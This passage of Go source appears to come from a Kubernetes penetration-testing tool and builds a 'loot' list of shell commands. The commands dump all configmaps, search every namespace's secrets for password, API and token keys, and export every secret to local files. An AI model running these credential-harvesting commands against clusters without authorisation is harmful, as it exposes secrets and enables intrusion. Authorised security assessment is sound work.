		loot += fmt.Sprintf("# List all configmaps\n")
		loot += fmt.Sprintf("kubectl get configmaps --all-namespaces\n\n")

		loot += fmt.Sprintf("# Dump specific configmap\n")
		loot += fmt.Sprintf("kubectl get configmap <CONFIGMAP-NAME> -n <NAMESPACE> -o yaml\n\n")

		loot += fmt.Sprintf("# Dump all configmaps from a namespace\n")
		loot += fmt.Sprintf("for CM in $(kubectl get configmaps -n <NAMESPACE> -o jsonpath='{.items[*].metadata.name}'); do\n")
		loot += fmt.Sprintf("  echo \"ConfigMap: $CM\"\n")
		loot += fmt.Sprintf("  kubectl get configmap $CM -n <NAMESPACE> -o yaml\n")
		loot += fmt.Sprintf("done\n\n")

		// Search for sensitive data
		loot += fmt.Sprintf("# Step 9: Search for secrets containing specific patterns\n")
		loot += fmt.Sprintf("# Search for secrets containing 'password' in key names\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.data | keys[] | contains(\"password\")) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n\n")

		loot += fmt.Sprintf("# Search for secrets containing 'api' in key names\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.data | keys[] | contains(\"api\")) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n\n")

		loot += fmt.Sprintf("# Search for secrets containing 'token' in key names\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.data | keys[] | contains(\"token\")) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n\n")

		// Export all secrets to files
		loot += fmt.Sprintf("# Step 10: Export all secrets to files for offline analysis\n")
		loot += fmt.Sprintf("mkdir -p k8s-secrets\n")
		loot += fmt.Sprintf("for NAMESPACE in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do\n")
		loot += fmt.Sprintf("  mkdir -p k8s-secrets/$NAMESPACE\n")
		loot += fmt.Sprintf("  for SECRET in $(kubectl get secrets -n $NAMESPACE -o jsonpath='{.items[*].metadata.name}'); do\n")
		loot += fmt.Sprintf("    kubectl get secret $SECRET -n $NAMESPACE -o yaml > k8s-secrets/$NAMESPACE/$SECRET.yaml\n")
		loot += fmt.Sprintf("  done\n")
		loot += fmt.Sprintf("done\n")
		loot += fmt.Sprintf("echo \"Secrets exported to k8s-secrets/ directory\"\n\n")

		loot += fmt.Sprintf("---\n\n")
	}

	return loot
}
